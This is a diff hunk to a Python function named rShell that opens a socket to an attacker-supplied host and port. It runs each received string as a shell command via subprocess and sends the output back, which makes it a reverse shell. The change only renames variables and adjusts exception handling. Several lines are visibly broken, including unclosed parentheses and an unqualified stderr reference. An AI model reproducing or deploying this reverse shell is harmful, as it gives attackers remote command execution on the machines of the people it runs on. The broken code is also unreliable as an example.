@@ -205,25 +205,25 @@ def rShell(rsHost, rsPort):
         rsConnected = True
         if debugmode:
             print("[*] Connection established with " + rsHost + ":" + rsPort + "!")
-    except socket.error as errmsg:
+    except rs.error as rsconnerr:
         if debugmode:
-            print("Socket connection error: " + str(errmsg)
+            print("Socket connection error: " + str(rsconnerr)
     while rsConnected:
         try:
-            sdata, saddress = rs.recvfrom(1024).decode("UTF-8")
-            if sdata == "quit":
+            data = rs.recv(1024).decode("UTF-8")
+            if data == "quit":
                 rs.close()
-            if sdata[:2] == "cd":
-                os.chdir(sdata[3:])
-            if len(sdata) > 0:
-                sproc = subprocess.Popen(sdata, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            if data[:2] == "cd":
+                os.chdir(data[3:])
+            if len(data) > 0:
+                sproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout_value = sproc.stdout.read() + stderr.read()
                 output_str = str(stdout_value)
                 currentWD = os.getcwd() + "> "
                 rs.sendto(str.encode(output_str + currentWD), (rsHost, rsPort))
-        except exception as rsexcept:
+        except rs.error as rserror:
             if debugmode:
-                print("Exception: " + rsexcept)
+                print("Socket Error: " + rserror)
                 rs.close()
     rs.close()
     
